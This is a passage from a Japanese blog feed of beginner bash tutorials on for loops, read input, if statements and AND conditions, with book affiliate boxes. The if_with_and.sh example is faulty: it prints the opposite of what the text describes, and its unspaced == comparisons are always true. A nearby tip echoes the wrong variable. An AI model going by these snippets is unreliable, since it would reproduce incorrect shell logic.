&lt;span class="nb">echo&lt;/span> -n &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$counter&lt;/span>&lt;span class="s2"> &amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">done&lt;/span>
&lt;span class="nb">printf&lt;/span> &lt;span class="s2">&amp;#34;\n&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash for_example.sh
10 9 8 7 6 5 4 3 2 1
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>以下、どの記法も同じ。書きやすいものを選べばいい。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;pre tabindex="0">&lt;code class="language-bash:三つの書き方" data-lang="bash:三つの書き方"># 冗長
for i in \`seq 10\`
do
echo &amp;quot;test&amp;quot;
done
# 簡素
for i in \`seq 10\`;do
echo &amp;quot;test&amp;quot;
done
# C/Javaライク
for((i=0;i&amp;lt;10;i++));do
echo &amp;quot;test&amp;quot;
done
&lt;/code>&lt;/pre>&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>【７．対話型入力】ざっくりわかる「シェルスクリプト」</title><link>https://suzukiiichiro.github.io/posts/2022-01-14-07-suzuki/</link><pubDate>Fri, 07 Jan 2022 10:03:12 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-14-07-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-14-07-suzuki/shellscript.jpg" alt="Featured image of post 【７．対話型入力】ざっくりわかる「シェルスクリプト」" />&lt;h2 id="対話型入力">対話型入力&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b> ユーザー入力の取得&lt;/b>&lt;/font>&lt;br>
&amp;lsquo;read&amp;rsquo;コマンドは、bashでユーザーから入力を受け取るために使用されます。&lt;br>
&amp;lsquo;user_input.sh&amp;rsquo;という名前のファイルを作成し、ユーザーから入力を取得するための次のスクリプトを追加します。&lt;br>
ここでは、1つの文字列値がユーザーから取得され、他の文字列値を組み合わせて値が表示されます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:user_input.sh" data-lang="bash:user_input.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;あなたの名前を入力して下さい&amp;#34;&lt;/span>
&lt;span class="nb">read&lt;/span> name
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;ようこそ &lt;/span>&lt;span class="nv">$name&lt;/span>&lt;span class="s2">. ＮＬＰへ&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash user_input.sh
あなたの名前を入力して下さい
suzuki
ようこそ suzuki。 ＮＬＰへ
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>以下のソースは read コマンドの手前でechoすらしない&lt;/dd>
&lt;dd>-p オプションだ。&lt;/dd>
&lt;dd>
&lt;p>read -p &amp;ldquo;INPUT:&amp;rdquo; str&lt;/p>
&lt;/dd>
&lt;dd>echo $str1&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>【８．If 文】ざっくりわかる「シェルスクリプト」</title><link>https://suzukiiichiro.github.io/posts/2022-01-14-08-suzuki/</link><pubDate>Fri, 07 Jan 2022 10:03:12 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-14-08-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-14-08-suzuki/shellscript.jpg" alt="Featured image of post 【８．If 文】ざっくりわかる「シェルスクリプト」" />&lt;h2 id="if-文">if 文&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b> if文を使う&lt;/b>&lt;/font>&lt;br>
単数、または複数の条件でif条件を使用できます。&lt;br>
このステートメントの開始ブロックと終了ブロックは、「if」と「fi」で定義されます。&lt;br>
「simple_if.sh」という名前のファイルを作成し、bashでのifステートメントの使用を確認します。&lt;br>
ここでは、変数nに10が割り当てられています。&lt;br>
$nの値が10未満の場合、出力は「1桁の数値です」になります。&lt;br>
それ以外の場合、出力は「2桁の数値です」になります。&lt;br>
比較のために、ここでは「-lt」を使用しています。&lt;/p>
&lt;table>
&lt;tr>&lt;th>オプション&lt;/th>&lt;th>意味&lt;/th>&lt;/tr>
&lt;tr>&lt;td>-eq&lt;/td>&lt;td>同　じ（==）&lt;/td>&lt;/tr>
&lt;tr>&lt;td>-lt&lt;/td>&lt;td>小さい（＜）&lt;/td>&lt;/tr>
&lt;tr>&lt;td>-gt&lt;/td>&lt;td>大きい（＞）&lt;/td>&lt;/tr>
&lt;/table>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:simple_if.sh" data-lang="bash:simple_if.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">n&lt;/span>&lt;span class="o">=&lt;/span>10&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="nv">$n&lt;/span> -lt &lt;span class="m">10&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;1桁の数値です&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;2桁の数値です&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash simple_if.sh
2桁の数値です
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>数値を比較する場合は、「&amp;lt;」「&amp;gt;」「=」ではなく、&lt;/dd>
&lt;dd>-eq -lt -gt を使う必要があります。&lt;/dd>
&lt;dd>
&lt;p>文字列を比較する場合は 「==」または 「!=」を使います。&lt;/p>
&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>【９．and 条件を if 文で使う】ざっくりわかる「シェルスクリプト」</title><link>https://suzukiiichiro.github.io/posts/2022-01-14-09-suzuki/</link><pubDate>Fri, 07 Jan 2022 10:03:12 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-14-09-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-14-09-suzuki/shellscript.jpg" alt="Featured image of post 【９．and 条件を if 文で使う】ざっくりわかる「シェルスクリプト」" />&lt;h2 id="and-条件を-if-文で使う">and 条件を if 文で使う&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>ANDロジックでifステートメントを使用する：&lt;/b>&lt;/font>&lt;br>
2つ以上の条件を持つifステートメントでは、さまざまなタイプの論理条件を使用できます。&lt;br>
andロジックを使用してifステートメントで複数の条件を定義する方法を次の例に示します。&lt;br>
&amp;lsquo;&amp;amp;&amp;amp;&amp;lsquo;は、ifステートメントのandロジックを適用するために使用されます。&lt;br>
&amp;lsquo;if_with_and.sh&amp;rsquo;という名前のファイルを作成して、次のコードを確認します。&lt;br>
ここで、ユーザー名とパスワードの変数の値はユーザーから取得され、「admin」および「secret」と比較されます。&lt;br>
両方の値が一致する場合、出力は「有効なユーザー」になります。一致しない場合、出力は「無効なユーザー」になります。&lt;/p>
&lt;font color=red>
数値を比較する場合は、「&lt;」「>」「=」ではなく、
-eq -lt -gt を使う必要があります。
文字列を比較する場合は 「==」または 「!=」を使います。
&lt;/font>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:if_with_and.sh" data-lang="bash:if_with_and.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;名前を入力して下さい&amp;#34;&lt;/span>
&lt;span class="nb">read&lt;/span> username
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;パスワードを入力して下さい&amp;#34;&lt;/span>
&lt;span class="nb">read&lt;/span> password
&lt;span class="k">if&lt;/span> &lt;span class="o">[[&lt;/span> &lt;span class="o">(&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$username&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">==&lt;/span>&lt;span class="s2">&amp;#34;admin&amp;#34;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$password&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">==&lt;/span>&lt;span class="s2">&amp;#34;secret&amp;#34;&lt;/span>&lt;span class="o">)&lt;/span> &lt;span class="o">]]&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;無効なユーザーです&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;有効なユーザーです&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash if_with_and.sh
名前を入力して下さい
suzuki
パスワードを入力して下さい
password
無効なユーザーです
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>数値を比較する場合は、「&amp;lt;」「&amp;gt;」「=」ではなく、&lt;/dd>
&lt;dd>-eq -lt -gt を使う必要があります。&lt;/dd>
&lt;dd>
&lt;p>文字列を比較する場合は 「==」または 「!=」を使います。&lt;/p>
&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
